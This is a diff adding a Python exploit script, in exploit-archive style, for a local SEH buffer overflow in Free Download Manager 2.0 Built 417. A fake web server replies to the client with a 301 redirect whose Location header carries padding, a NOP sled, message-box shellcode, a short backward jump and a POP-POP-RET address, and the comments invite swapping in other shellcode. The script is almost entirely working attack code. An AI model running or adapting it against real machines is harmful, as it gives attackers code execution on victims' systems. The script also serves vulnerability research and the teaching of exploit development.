@@ -1,0 +1,56 @@
+# Exploit Title: Free Download Manager 2.0 Built 417 - Local Buffer Overflow (SEH)
+# Date: 2018-04-23
+# Exploit Author: Marwan Shamel
+# Software Link: https://filehippo.com/download_free_download_manager/925/
+# Version: v2.0 Built 417
+# Tested on: Windows 7 Enterprise SP1 32 bit
+# Special thanks to my wife
+# Steps : file > Import > Import lists of downloads >  open URL file that includes http://192.168.1.53:81 (HOST|Port changed according to your needs)  
+
+#!/usr/bin/python
+
+from socket import *
+from time import sleep
+  
+host = "192.168.1.53"
+port = 81
+  
+s = socket(AF_INET, SOCK_STREAM)
+s.bind((host, port))
+s.listen(1)
+print "\n[+] Listening on %d ..." % port
+  
+cl, addr = s.accept()
+print "[+] Connection accepted from %s" % addr[0]
+
+nseh = "\xeb\x88\x90\x90"  #Short Jump backward 118bytes (jmp short 0xffffff8a) (more bytes can be jumped backwards depending on the shell code size required )
+seh = "\xd1\x9c\x4a\x00"   #address to trigger POP-POP-RETURN sequence
+# Evil produce a message box 113 bytes can be changed according to your needs
+evil = "\x31\xd2\xb2\x30\x64\x8b\x12\x8b\x52\x0c\x8b\x52\x1c\x8b\x42\x08\x8b\x72\x20\x8b\x12\x80\x7e\x0c\x33\x75\xf2\x89\xc7\x03\x78\x3c\x8b\x57\x78\x01\xc2\x8b\x7a\x20\x01\xc7\x31\xed\x8b\x34\xaf\x01\xc6\x45\x81\x3e\x46\x61\x74\x61\x75\xf2\x81\x7e\x08\x45\x78\x69\x74\x75\xe9\x8b\x7a\x24\x01\xc7\x66\x8b\x2c\x6f\x8b\x7a\x1c\x01\xc7\x8b\x7c\xaf\xfc\x01\xc7\x68\x79\x74\x65\x01\x68\x6b\x65\x6e\x42\x68\x20\x42\x72\x6f\x89\xe1\xfe\x49\x0b\x31\xc0\x51\x50\xff\xd7"
+payload = "\x43" * (1724-255) + "\x90" * 142 + evil +  nseh + seh
+
+buffer = "HTTP/1.1 301 Moved Permanently\r\n"
+buffer += "Date: Thu, 23 Feb 2018 10:21:08 GMT\r\n"
+buffer += "Server: Apache/2.2.22 (Debian)\r\n"
+buffer += "Location: "+ payload + "\r\n"
+buffer += "Vary: Accept-Encoding\r\n"
+buffer += "Content-Length: 8000\r\n"
+buffer += "Keep-Alive: timeout=5, max=100\r\n"
+buffer += "Connection: Keep-Alive\r\n"
+buffer += "Content-Type: text/html; charset=iso-8859-1\r\n"
+buffer += "\r\n"
+buffer += "<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\">\n"
+buffer += "<html><head>\n"
+buffer += "<title>301 Moved Permanently</title>\n"
+buffer += "</head><body>\n"
+buffer += "<h1>Moved Permanently</h1>\n"
+buffer += "<p>The document has moved <ahref=\""+payload+"\">here</a>.</p>\n"
+buffer += "</body></html>\n"
+  
+print cl.recv(1000)
+cl.send(buffer)
+print "[+] Sending buffer: OK\n"
+  
+sleep(1)
+cl.close()
+s.close()
